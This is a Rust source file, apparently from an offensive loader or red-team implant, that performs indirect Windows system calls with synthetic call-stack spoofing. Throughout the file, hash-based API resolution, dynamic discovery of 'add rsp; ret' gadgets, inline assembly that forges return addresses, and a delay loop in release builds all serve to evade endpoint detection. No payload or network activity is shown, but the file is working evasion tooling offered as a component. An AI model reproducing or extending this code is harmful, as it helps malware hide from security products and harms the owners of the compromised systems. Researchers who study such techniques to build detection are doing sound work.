use std::arch::asm;
use crate::syscall::common::{SyscallData, get_loaded_module_by_hash, get_export_by_hash, find_suitable_ret_gadget, get_runtime_function_table, find_gadget_with_unwind_info, RuntimeFunction};

pub trait ToSyscallArg { fn to_arg(self) -> usize; }
impl ToSyscallArg for usize { fn to_arg(self) -> usize { self } }
impl ToSyscallArg for isize { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for u64 { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for i64 { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for u32 { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for i32 { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for u16 { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for u8  { fn to_arg(self) -> usize { self as usize } }
impl<T> ToSyscallArg for *const T { fn to_arg(self) -> usize { self as usize } }
impl<T> ToSyscallArg for *mut T   { fn to_arg(self) -> usize { self as usize } }
impl<T> ToSyscallArg for &T       { fn to_arg(self) -> usize { self as *const T as usize } }
impl<T> ToSyscallArg for &mut T   { fn to_arg(self) -> usize { self as *mut T as usize } }

#[derive(Clone, Copy, Debug)]
pub struct SpoofContext {
    pub gadget: usize,
    pub gadget_offset: usize,  // Stack offset for 'add rsp, X'
    pub btit: usize,           // BaseThreadInitThunk
    pub ruts: usize,           // RtlUserThreadStart
}

/// Helper function to get spoofing exports from kernel32 and ntdll
unsafe fn get_spoof_exports(k32_base: *mut u8) -> Option<(usize, usize)> {
    let ntdll_hash = crate::dbj2_hash!(b"ntdll.dll");
    let ntdll_base = get_loaded_module_by_hash(ntdll_hash)?;
    
    let btit_entry = get_export_by_hash(k32_base, crate::dbj2_hash!(b"BaseThreadInitThunk"))? as usize;
    let ruts_entry = get_export_by_hash(ntdll_base, crate::dbj2_hash!(b"RtlUserThreadStart"))? as usize;
    
    #[cfg(feature = "debug")]
    {
        crate::utils::print_message(&format!("BaseThreadInitThunk: {:#x}", btit_entry));
        crate::utils::print_message(&format!("RtlUserThreadStart: {:#x}", ruts_entry));
    }

    Some((btit_entry, ruts_entry))
}

pub unsafe fn get_spoof_context() -> Option<SpoofContext> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Initializing Stack Spoofing Context (SilentMoonwalk-style)...");

    // Try dynamic gadget discovery via UNWIND_INFO first
    let k32_hash = crate::dbj2_hash!(b"kernel32.dll");
    let k32_base = get_loaded_module_by_hash(k32_hash)?;

    if let Some((rt_table, rt_count)) = get_runtime_function_table(k32_base) {
        #[cfg(feature = "debug")]
        crate::utils::print_message(&format!("Runtime function table found: {} functions", rt_count));

        if let Some((gadget, offset)) = find_gadget_with_unwind_info(k32_base, rt_table, rt_count) {
            #[cfg(feature = "debug")]
            {
                crate::utils::print_message(&format!("Dynamic gadget discovered at: {:#x}", gadget));
                crate::utils::print_message(&format!("Gadget stack offset: {:#x}", offset));
            }

            let (btit_entry, ruts_entry) = get_spoof_exports(k32_base)?;

            return Some(SpoofContext {
                gadget,
                gadget_offset: offset,
                btit: btit_entry,
                ruts: ruts_entry,
            });
        } else {
            #[cfg(feature = "debug")]
            crate::utils::print_message("No suitable gadget found in runtime function table");
        }
    } else {
        #[cfg(feature = "debug")]
        crate::utils::print_message("Runtime function table not available");
    }

    // Fallback to simple gadget search
    #[cfg(feature = "debug")]
    crate::utils::print_message("Falling back to simple gadget pattern search...");

    let gadget = find_suitable_ret_gadget()?;
    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("Found fallback gadget at: {:#x}", gadget));

    let (btit_entry, ruts_entry) = get_spoof_exports(k32_base)?;

    // For fallback mode, use conservative offset
    Some(SpoofContext {
        gadget,
        gadget_offset: 0x68,
        btit: btit_entry,
        ruts: ruts_entry,
    })
}

static mut SPOOF_CTX: Option<SpoofContext> = None;
static INIT_SPOOF: std::sync::Once = std::sync::Once::new();

pub unsafe fn get_cached_spoof_context() -> Option<SpoofContext> {
    INIT_SPOOF.call_once(|| {
        SPOOF_CTX = get_spoof_context();
    });
    SPOOF_CTX
}

/// Minimal direct indirect-syscall bridge.
/// Loads SSN into EAX, marshals args into syscall registers/stack, then CALLs the syscall instruction.
#[no_mangle]
pub unsafe extern "C" fn direct_syscall_bridge(
    ssn: u16,
    syscall_inst: usize,
    args: *const usize,
    num_args: usize,
) -> usize {
    let mut result: usize;
    asm!(
        "cld", // Clear direction flag for safety
        // Preserve non-volatile registers we touch
        "push rbp", "push rbx", "push r12", "push r13", "push r14", "push r15",
        "mov rbp, rsp",

        // rdx = syscall_inst, rcx = ssn, r8 = args, r9 = num_args
        "mov ebx, ecx",      // ssn -> ebx
        "mov r11, rdx",      // syscall_inst -> r11 (callee)

        // stack space for shadow + extra args (beyond 4)
        // Logic: size = max(0, num_args - 4) * 8 + 32 (shadow)
        // Then align to 16 bytes and add 8 to ensure rsp % 16 == 0 after 'sub rsp, size'
        // (because current rsp % 16 == 8 due to return address + 6 pushes)
        "xor r10, r10",      // r10 = 0
        "mov r12, r9",       // n = num_args
        "sub r12, 4",
        "cmovl r12, r10",    // if negative set to 0
        "shl r12, 3",        // *8
        "add r12, 32",       // shadow space
        "add r12, 15",
        "and r12, -16",      // align
        "add r12, 8",        // keep 16-byte alignment after call
        "sub rsp, r12",

        // copy stack args (5+)
        "cmp r9, 4",
        "jbe 4f",
        "mov r13, r9",
        "sub r13, 4",
        "lea r14, [r8 + 32]", // args[4]
        "xor r15, r15",
        "5:",
        "mov rax, [r14 + r15*8]",
        "mov [rsp + 32 + r15*8], rax",
        "inc r15",
        "cmp r15, r13",
        "jl 5b",

        "4:",
        // load first four args
        "xor r12, r12", "xor r13, r13", "xor r14, r14", "xor r15, r15",
        "test r9, r9", "jz 3f",
        "mov r12, [r8]",        // a1
        "cmp r9, 1", "jbe 3f",
        "mov r13, [r8 + 8]",    // a2
        "cmp r9, 2", "jbe 3f",
        "mov r14, [r8 + 16]",   // a3
        "cmp r9, 3", "jbe 3f",
        "mov r15, [r8 + 24]",   // a4

        "3:",
        // syscall register mapping
        "mov r10, r12", // RCX -> R10
        "mov rdx, r13", // RDX
        "mov r8,  r14", // R8
        "mov r9,  r15", // R9
        "mov eax, ebx", // SSN

        "call r11",      // jump to the syscall instruction

        // restore
        "mov rsp, rbp",
        "pop r15", "pop r14", "pop r13", "pop r12", "pop rbx", "pop rbp",
        out("rax") result,
        in("rcx") ssn,
        in("rdx") syscall_inst,
        in("r8") args,
        in("r9") num_args,
        clobber_abi("C"),
    );
    result
}

/// Advanced indirect-syscall bridge with synthetic stack frames (SilentMoonwalk-style).
/// Uses a dynamically-discovered 'add rsp, X; ret' gadget to hide return addresses.
#[no_mangle]
pub unsafe extern "C" fn spoofed_syscall_bridge(
    ssn: u16,
    syscall_inst: usize,
    args: *const usize,
    num_args: usize,
    ctx: &SpoofContext,
) -> usize {
    let mut result: usize;
    
    asm!(
        "cld",
        // Preserve ALL non-volatile registers
        "push rbp", "push rbx", "push rdi", "push rsi", "push r12", "push r13", "push r14", "push r15",
        "mov rbp, rsp",

        // 1. Calculate total allocation
        // We need: 8 (gadget) + gadget_offset + 8 (real_ret)
        "mov r12, {gadget_offset}",
        "mov rax, r12",
        "add rax, 16",
        "add rax, 15",
        "and rax, -16",
        "sub rsp, rax",

        // 2. Place the gadget address at [RSP]
        "mov r13, {gadget}",
        "mov [rsp], r13",

        // 3. Place the real return address at [RSP + gadget_offset + 8]
        "lea r13, [rip + 2f]",
        "mov r11, r12",               // r12 is gadget_offset
        "add r11, 8",
        "mov [rsp + r11], r13",

        // 4. Setup syscall arguments
        "mov r14, {num_args}",
        "mov r15, {args}",
        
        // Copy extra args (5+) to stack starting at [rsp + 40]
        "cmp r14, 4",
        "jbe 4f",
        "mov r11, r14",
        "sub r11, 4",                 // count = num_args - 4
        "lea r13, [r15 + 32]",        // src = args[4]
        "xor rax, rax",               // i = 0
        "5:",
        "mov r10, [r13 + rax*8]",
        "mov [rsp + 40 + rax*8], r10",
        "inc rax",
        "cmp rax, r11",
        "jl 5b",

        "4:",
        // Load first 4 args into registers
        "xor r10, r10", "xor rdx, rdx", "xor r8, r8", "xor r9, r9",
        "test r14, r14", "jz 3f",
        "mov r10, [r15]",
        "cmp r14, 1", "jbe 3f",
        "mov rdx, [r15 + 8]",
        "cmp r14, 2", "jbe 3f",
        "mov r8, [r15 + 16]",
        "cmp r14, 3", "jbe 3f",
        "mov r9, [r15 + 24]",

        "3:",
        // Final setup: SSN in EAX, syscall target in R11
        "mov eax, {ssn:e}",
        "mov r11, {syscall_inst}",
        "jmp r11",

        // Recovery point
        "2:",
        "mov rsp, rbp",
        "pop r15", "pop r14", "pop r13", "pop r12", "pop rsi", "pop rdi", "pop rbx", "pop rbp",

        ssn = in(reg) ssn,
        syscall_inst = in(reg) syscall_inst,
        args = in(reg) args,
        num_args = in(reg) num_args,
        gadget = in(reg) ctx.gadget,
        gadget_offset = in(reg) ctx.gadget_offset,
        out("rax") result,
        clobber_abi("C"),
    );
    result
}

#[allow(dead_code)]
pub unsafe fn direct_invoke_generic(data: &SyscallData, args: &[usize]) -> usize {
    if data.syscall_inst == 0 {
        #[cfg(feature = "debug")]
        crate::utils::print_error("Syscall", &"Invalid syscall instruction address (0)");
        return 0xC0000001;
    }

    direct_syscall_bridge(data.ssn, data.syscall_inst, args.as_ptr(), args.len())
}
#[allow(dead_code)]
pub unsafe fn direct_invoke_with_spoof(data: &SyscallData, args: &[usize]) -> usize {
    if data.syscall_inst == 0 {
        #[cfg(feature = "debug")]
        crate::utils::print_error("Syscall", &"Invalid syscall instruction address (0)");
        return 0xC0000001;
    }

    if let Some(ctx) = get_cached_spoof_context() {
        #[cfg(feature = "debug")]
        crate::utils::print_message(&format!(
            "Invoking spoofed syscall: SSN={:#x}, Inst={:#x}, Gadget={:#x}, Offset={:#x}",
            data.ssn, data.syscall_inst, ctx.gadget, ctx.gadget_offset
        ));
        #[cfg(not(feature = "debug"))]
        for _ in 0..1000000 { core::hint::spin_loop(); }
        let result = spoofed_syscall_bridge(data.ssn, data.syscall_inst, args.as_ptr(), args.len(), &ctx);
        #[cfg(feature = "debug")]
        crate::utils::print_message(&format!("Spoofed syscall completed, result: {:#x}", result));
        result
    } else {
        #[cfg(feature = "debug")]
        crate::utils::print_message("Spoof context unavailable, falling back to direct indirect-syscall");
        let result = direct_syscall_bridge(data.ssn, data.syscall_inst, args.as_ptr(), args.len());
        result
    }
}